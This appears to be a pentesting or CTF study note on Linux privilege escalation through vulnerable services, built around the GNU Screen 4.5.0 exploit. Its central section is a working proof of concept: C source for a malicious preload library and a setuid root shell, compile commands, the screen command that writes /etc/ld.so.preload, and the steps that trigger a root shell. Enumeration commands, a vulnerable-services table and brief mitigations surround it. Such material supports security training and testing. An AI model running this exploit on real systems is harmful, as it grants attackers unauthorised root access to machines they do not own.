# Linux Privilege Escalation – Vulnerable Services

## Overview

Installed services often contain **known vulnerabilities** that can be leveraged for privilege escalation. These vulnerabilities may arise from:

- outdated software versions
- insecure default configurations
- improper permission handling
- unsafe file operations
- weak service isolation
- vulnerable SUID binaries
- insecure library loading mechanisms

During enumeration, always identify:

```bash
installed services
service versions
running daemons
exposed sockets
legacy software
```

Many privilege escalation paths rely on exploiting **public CVEs** affecting installed software.

---

# Identifying Vulnerable Services

Check service versions:

```bash
-- version flags
```

Examples:

```bash
screen -v
sudo -V
pkexec --version
openssl version
python --version
```

---

List running services:

```bash
ps aux
systemctl list-units --type=service
```

---

List listening services:

```bash
ss -lntp
netstat -tulpn
```

---

List installed packages:

```bash
apt list --installed
dpkg -l
rpm -qa
```

---

Search for SUID services:

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

# Example Vulnerable Service – GNU Screen 4.5.0

GNU Screen is a terminal multiplexer commonly installed on Linux systems.

Version **4.5.0** contains a privilege escalation vulnerability caused by improper permissions handling when opening log files.

Check version:

```bash
screen -v
```

Example output:

```text
Screen version 4.05.00 (GNU) 10-Dec-16
```

If screen binary is SUID:

```bash
-rwsr-xr-x 1 root root /usr/bin/screen-4.5.0
```

It may be exploitable.

---

# Vulnerability Mechanism

The vulnerability allows attackers to:

- create arbitrary files as root
- overwrite protected files
- manipulate dynamic linker configuration
- execute malicious shared libraries
- obtain root shell

The exploit abuses:

```bash
/etc/ld.so.preload
```

This file forces Linux loader to execute shared libraries before any other library.

---

# Exploitation Workflow

Execute exploit script:

```bash
./screen_exploit.sh
```

Exploit actions:

1. create malicious shared library
2. write library path to `/etc/ld.so.preload`
3. trigger execution via SUID screen binary
4. spawn root shell

---

# Proof of Concept Exploit

```bash
#!/bin/bash

echo "[+] Creating malicious library..."

cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
```

Compile malicious shared object:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

---

Create root shell binary:

```bash
cat << EOF > /tmp/rootshell.c
#include <stdio.h>

int main(void){
    setuid(0);
    setgid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
```

Compile:

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c
```

---

Create preload file:

```bash
cd /etc
umask 000

screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

---

Trigger exploit:

```bash
screen -ls
```

Spawn root shell:

```bash
/tmp/rootshell
```

---

Verify root access:

```bash
id
```

Example output:

```text
uid=0(root)
```

---

# Why This Works

Dynamic loader behaviour:

```bash
/etc/ld.so.preload
```

forces execution of attacker-controlled library.

Because screen runs as root:

library executes with root privileges.

---

# Other Common Vulnerable Services

| Service | Risk |
|--------|------|
| pkexec | memory corruption exploits |
| sudo | heap overflow CVEs |
| polkit | authentication bypass |
| cron | writable job execution |
| snapd | privilege escalation bugs |
| docker | container escape |
| systemd | misconfiguration risks |
| openssh | legacy privilege bugs |
| mysql | weak permissions |
| apache | module vulnerabilities |
| nginx | misconfiguration |
| cups | command execution flaws |

---

# Finding Exploitable Versions

Search for CVEs:

```bash
searchsploit screen 4.5.0
```

Check exploit database:

```bash
searchsploit <software>
```

---

Search manually:

```bash
dpkg -l | grep screen
```

---

Check vulnerable packages automatically:

```bash
linpeas.sh
linux-exploit-suggester.sh
```

---

# Enumeration Checklist

## Identify service versions

```bash
screen -v
sudo -V
pkexec --version
```

---

## Identify SUID services

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## Identify running services

```bash
ps aux
```

---

## Identify installed packages

```bash
apt list --installed
```

---

## Search exploit database

```bash
searchsploit <service>
```

---

## Check shared library abuse potential

```bash
ldd binary
```

---

# Defensive Mitigation

Prevent exploitation:

- patch outdated software
- remove unnecessary SUID permissions
- restrict ld.so.preload write permissions
- restrict writable directories
- monitor unusual library loads
- restrict compiler access
- remove unused services
- implement application allow-listing

Audit SUID services:

```bash
chmod u-s binary
```

---

# Quick Vulnerable Services Cheatsheet

```bash
screen -v

find / -perm -4000 -type f 2>/dev/null

ps aux

dpkg -l

searchsploit <service>

ldd binary

gcc exploit.c -o exploit

/tmp/exploit
```

---

# Key Takeaways

- outdated services frequently contain privilege escalation vulnerabilities
- SUID binaries present highest risk
- shared library injection is common attack vector
- ld.so.preload manipulation enables root execution
- CVE research is critical during enumeration
- always check versions of installed services
- automated enumeration tools accelerate discovery
- removing unnecessary services reduces attack surface

---

# Tags

#linux
#privilege-escalation
#cve
#screen
#services
#post-exploitation
#enumeration
#ctf
#pentesting
#obsidian